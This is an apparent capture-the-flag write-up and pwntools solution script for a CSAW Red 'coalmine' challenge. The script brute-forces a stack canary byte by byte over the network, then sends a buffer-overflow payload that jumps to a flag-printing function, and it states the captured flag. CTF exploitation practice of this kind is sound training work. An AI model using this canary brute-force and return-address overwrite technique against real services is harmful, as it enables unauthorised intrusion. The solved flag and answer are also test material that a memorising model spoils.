#!/usr/bin/env python3

################################ Write-Up ######################################
# Points: 125
# Category: pwn
# Prompt: This bird will definitely protect me down in the mine.
# nc pwn.red.csaw.io 5005
#
# It was exactly like the canaRy chall in picoCTF 2019. Just bruteforce the
# canary and then using it to create a buffer overflow that jumps to displaying
# the flag.
#
# Flag: flag{H0w_d1d_U_g37_pA5t_mY_B1rD???}
# Solved by: Ryan Nguyen
################################################################################

from pwn import *

exe = ELF("./coalmine")

context.binary = exe

def main():
	padding1 = "a"*32
	padding2 = "a"*20
	display_flag_addr = "\xa6\x86\x04\x08"
	canary = ''
	# Brute forcing the canary
	for i in range(1,9):
		for j in range(256):
			r = remote("pwn.red.csaw.io", 5005) #process([exe.path])
			r.recvuntil("How many letters should its name have?\n> ")
			r.sendline(str(32+i))
			r.recvuntil(">")
			r.sendline(padding1 + canary + chr(j))
			result = str(r.recvall())
			if not("Smashing" in result):
				canary += chr(j)
				print("Canary byte found!")
				break
	print("Sauce: " + canary) #On server: a6\x86\x04\xdc#\xfa\xf7\xb4\xff
	for i in range(100): #We have to run this multiple times bc addrs randomized. We are going to try until our half bytes match up to the randomized display_flag addr.
		r = remote("pwn.red.csaw.io", 5005) #process([exe.path])
		r.recvuntil("How many letters should its name have?\n>")
		r.sendline("64") # Length of payload
		r.recvuntil("> ")
		r.sendline(padding1 + canary + padding2 + display_flag_addr)

if __name__ == "__main__":
	main()
